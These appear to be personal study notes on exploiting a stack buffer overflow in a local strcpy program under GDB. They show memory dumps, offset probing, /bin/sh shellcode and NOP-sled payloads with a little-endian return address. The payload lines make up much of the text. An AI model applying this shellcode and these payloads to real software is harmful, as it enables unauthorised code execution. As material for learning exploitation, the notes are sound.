# GDB Commands

## GDB Usage:

```bash
quit        # quit
ctrl + l    # clear the screen
shell clear # clear the screen
```

## Steps

### Show Debugging Symbols, ie. code

```bash
list        # current point
list main   # main function
```

### Show the Assemlby code of main function

```bash
disas main
```

```
Dump of assembler code for function main:
   0x0000000008001135 <+0>:     push   %rbp
   0x0000000008001136 <+1>:     mov    %rsp,%rbp
   0x0000000008001139 <+4>:     sub    $0x210,%rsp
   0x0000000008001140 <+11>:    mov    %edi,-0x204(%rbp)
   0x0000000008001146 <+17>:    mov    %rsi,-0x210(%rbp)
   0x000000000800114d <+24>:    mov    -0x210(%rbp),%rax
   0x0000000008001154 <+31>:    add    $0x8,%rax
   0x0000000008001158 <+35>:    mov    (%rax),%rdx
   0x000000000800115b <+38>:    lea    -0x200(%rbp),%rax
   0x0000000008001162 <+45>:    mov    %rdx,%rsi
   0x0000000008001165 <+48>:    mov    %rax,%rdi
   0x0000000008001168 <+51>:    callq  0x8001030 <strcpy@plt>
   0x000000000800116d <+56>:    mov    $0x0,%eax
   0x0000000008001172 <+61>:    leaveq
   0x0000000008001173 <+62>:    retq
End of assembler dump.
```

### Examine information

```bash
info os
info functions
info variables
info registers
bash


### Run the Program, with "Hello as "input

```bash
run Hello
```

### Run the overflow, seg fault: 520 is buffer size on my pc to cause overflow (8x64, where 8 is alignment)

```bash
run $(python -c 'print "\x41" * 518') # [Inferior 1 (process 1906) exited normally]
run $(python -c 'print "\x41" * 520') # 0x00 00 7f ff ff 02 1b 03 in __libc_start_main (main=0x800064a <main>, argc=2, argv=0x7ffffffeeb58, init=0x4141414141414141, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffffffeeb48)
run $(python -c 'print "\x41" * 522') # 0x00 00 7f ff ff 00 41 41 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
run $(python -c 'print "\x41" * 524') # 0x00 00 7f 00 41 41 41 41 in ?? ()
run $(python -c 'print "\x41" * 526') # 0x00 00 41 41 41 41 41 41 in ?? ()
run $(python -c 'print "\x41" * 528') # 0x00 00 00 00 08 00 06 88 in main (argc=2, argv=0x7ffffffeeb58) at vuln.c:10
run $(python -c 'print "\x41" * 530') # 0x00 00 00 00 08 00 06 88 in main (argc=2, argv=0x7ffffffeeb58) at vuln.c:10
run $(python -c 'print "\x41" * 532') # 0x00 00 00 00 08 00 06 88 in main (argc=2, argv=0x7ffffffeeb58) at vuln.c:10
```

### Examine registers after 526

```bash
info registers
```

```bash
rax            0x0                 0
rbx            0x0                 0
rcx            0x7fffff66d710      140737478317840
rdx            0x0                 0
rsi            0x7ffffffeef50      140737488285520
rdi            0x7ffffffeea7e      140737488284286
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7ffffffeea80      0x7ffffffeea80
r8             0x7fffff78cd80      140737479495040
r9             0x7fffff78cd80      140737479495040
r10            0xfffffffffffff3f4  -3084
r11            0x7fffff74ca60      140737479232096
r12            0x8001050           134221904
r13            0x7ffffffeeb50      140737488284496
r14            0x0                 0
r15            0x0                 0
rip            0x414141414141      0x414141414141
eflags         0x10206             [ PF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

# find a location, below ESP (stack pointer)
# EDI = destination index, string / array copying
# RDI = destination index, string / array copying
# ESI = source index, string + array copying
# RSI = source index, string + array copying
# EIP = index pointer, next address to execute
# RIP = index pointer, next address to execute
# EBP = stack base pointer
# RBP = stack base pointer
# ESP = stack pointer, starting in high memory, going down
# RSP = stack pointer, starting in high memory, going down
# EDX = data register
# RDX = data register
```

### Examine memory address

```bash
x/200x ($esp - 600) # x86
x/200x ($rsp - 600) # amd64
```

```bash
0x7ffffffee828: 0xff7c970c      0x00007fff      0x00000000      0x00000000
0x7ffffffee838: 0xfffee8f8      0x00007fff      0x00000000      0x00000000
0x7ffffffee848: 0xff7e9190      0x00007fff      0x00000000      0x00000000
0x7ffffffee858: 0x0800116d      0x00000000      0xfffeeb58      0x00007fff
0x7ffffffee868: 0xfffef268      0x00000002      0x41414141      0x41414141
0x7ffffffee878: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee888: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee898: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8a8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8b8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8c8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8d8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8e8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee8f8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee908: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee918: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee928: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee938: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee948: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee958: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee968: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee978: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee988: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee998: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9a8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9b8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9c8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9d8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9e8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffee9f8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea08: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea18: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea28: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea38: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea48: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea58: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea68: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffffffeea78: 0x41414141      0x00004141      0x00000000      0x00000000
0x7ffffffeea88: 0xfffeeb58      0x00007fff      0x00040000      0x00000002
0x7ffffffeea98: 0x08001135      0x00000000      0x00000000      0x00000000
0x7ffffffeeaa8: 0x48cdac60      0xf7388cf4      0x08001050      0x00000000
0x7ffffffeeab8: 0xfffeeb50      0x00007fff      0x00000000      0x00000000
0x7ffffffeeac8: 0x00000000      0x00000000      0xbecdac60      0x08c76309
0x7ffffffeead8: 0xeb6bac60      0x08c7624a      0x00000000      0x00000000
0x7ffffffeeae8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffffffeeaf8: 0xfffeeb70      0x00007fff      0xff7e9190      0x00007fff
0x7ffffffeeb08: 0xff7cf496      0x00007fff      0x00000000      0x00000000
0x7ffffffeeb18: 0x00000000      0x00000000      0x08001050      0x00000000
0x7ffffffeeb28: 0xfffeeb50      0x00007fff      0x00000000      0x00000000
0x7ffffffeeb38: 0x0800107a      0x00000000      0xfffeeb48      0x00007fff
```

### ASM code,zsh is needed:

* Hello World

```py
"\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\x00\x00\x00\x00\x00\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05"
```

* `execveat("/bin//sh")` - 29 bytes

```py
"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
```

* `execveat("/bin//sh")` - 27 bytes

```py
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
```


### Adding ASM code to string:

```bash
run $(python -c 'print "\x41" * 526 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"')
```

### Adding NOP sled" NOP == '\x90'

```bash
run $(python -c 'print "\x90" * 526 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"')
run $(python -c 'print "\x90" * 526 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" + "\x51\x51\x51\x51\x51\x51\x51\*" * 20')
# 526 bytes - (29 bytes ASM code + 60 bytes return address) = 437 (434 with alignment): 0x00 00 00 51 51 51 51 51 in ?? ()
run $(python -c 'print "\x90" * 437 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" + "\x51\x51\x51\x51\x51\x51" * 10')
# 526 bytes - (29 bytes ASM code + 80 bytes return address) = 417 (424 with alignment): 0x00 00 00 51 51 51 51 51 in ?? ()
run $(python -c 'print "\x90" * 417 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"+ "\x51\x51\x51\x51\x51\x51\x51\x51" * 10')
```

### Examine memory address

```bash
x/200x ($esp - 550) # x86
x/200x ($rsp - 550) # amd64
```

```bash
0x7ffffffee85a: 0x00000800      0xeb580000      0x7ffffffe      0xf2680000
0x7ffffffee86a: 0x0002fffe      0x90900000      0x90909090      0x90909090
0x7ffffffee87a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee88a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee89a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8aa: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8ba: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8ca: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8da: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8ea: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee8fa: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee90a: 0x90909090      0x90909090      0x90909090      0x90909090 # <<<<<<<<<<<<<<<<<<<<<<
0x7ffffffee91a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee92a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee93a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee94a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee95a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee96a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee97a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee98a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee99a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9aa: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9ba: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9ca: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9da: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9ea: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffee9fa: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffeea0a: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffffffeea1a: 0x90909090      0x90909090      0x6a909090      0xc4fe5842
0x7ffffffeea2a: 0x48529948      0x69622fbf      0x732f2f6e      0x5e545768
0x7ffffffeea3a: 0x49d08949      0x050fd289      0x51515151      0x51515151
0x7ffffffeea4a: 0x51515151      0x51515151      0x51515151      0x51515151
0x7ffffffeea5a: 0x51515151      0x51515151      0x51515151      0x51515151
0x7ffffffeea6a: 0x51515151      0x51515151      0x51515151      0x51515151
0x7ffffffeea7a: 0x51515151      0x00000000      0x00000000      0xeb580000
0x7ffffffeea8a: 0x7ffffffe      0x00000000      0x00020004      0x11350000
0x7ffffffeea9a: 0x00000800      0x00000000      0x00000000      0xf6160000
0x7ffffffeeaaa: 0x99cd293e      0x1050c2ab      0x00000800      0xeb500000
0x7ffffffeeaba: 0x7ffffffe      0x00000000      0x00000000      0x00000000
0x7ffffffeeaca: 0x00000000      0xf6160000      0x7630df3e      0xf6163d54
0x7ffffffeeada: 0x77738a98      0x00003d54      0x00000000      0x00000000
0x7ffffffeeaea: 0x00000000      0x00000000      0x00000000      0xeb700000
0x7ffffffeeafa: 0x7ffffffe      0x91900000      0x7fffff7e      0xf4960000
0x7ffffffeeb0a: 0x7fffff7c      0x00000000      0x00000000      0x00000000
0x7ffffffeeb1a: 0x00000000      0x10500000      0x00000800      0xeb500000
0x7ffffffeeb2a: 0x7ffffffe      0x00000000      0x00000000      0x107a0000
0x7ffffffeeb3a: 0x00000800      0xeb480000      0x7ffffffe      0x001c0000
0x7ffffffeeb4a: 0x00000000      0x00020000      0x00000000      0xecff0000
0x7ffffffeeb5a: 0x7ffffffe      0xed420000      0x7ffffffe      0x00000000
0x7ffffffeeb6a: 0x00000000      0xef510000      0x7ffffffe      0xef5d0000
```

### Choose memory address

```bash
0x7ffffffee90a
0x7f ff ff fe e9 0a
7f ff ff fe e9 0a
\x7f\xff\xff\xfe\xe9\x0a
# Little Endian:
0a e9 fe ff ff 7f
\x0a\xe9\xfe\xff\xff\x7f


# 526 bytes - (29 bytes ASM code + 60 bytes return address) = 437 (434 with alignment): 0x00 00 00 51 51 51 51 51 in ?? ()
run $(python -c 'print "\x90" * 437 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" + "\x51\x51\x51\x51\x51\x51" * 10')
# 526 bytes - (27 bytes ASM code + 60 bytes return address) = 439 (434 with alignment): 0x00 00 00 51 51 51 51 51 in ?? ()
run $(python -c 'print "\x90" * 439 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x51\x51\x51\x51\x51\x51" * 10')

# Final string:
run $(python -c 'print "\x90" * 437 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" + "\x0a\xe9\xfe\xff\xff\x7f" * 10')
run $(python -c 'print "\x90" * 490 + "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" + "\x0a\xe9\xfe\xff\xff\x7f" * 10')

run $(python -c 'print "\x90" * 439 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x0a\xe9\xfe\xff\xff\x7f" * 10')
run $(python -c 'print "\x90" * 492 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x0a\xe9\xfe\xff\xff\x7f" * 10')

```

### Convert memory address to little endian

```bash
# ecx            0xbfffffc0	-1073741888
# edx            0xbffffc3a	-1073742790
# ebx            0xb7fb8000	-1208254464
# esp            0xbffffc40	0xbffffc40
# ebp            0x51515151	0x51515151

# 0xbf ff fa ba
# \xba\xfa\xff\xbf
```
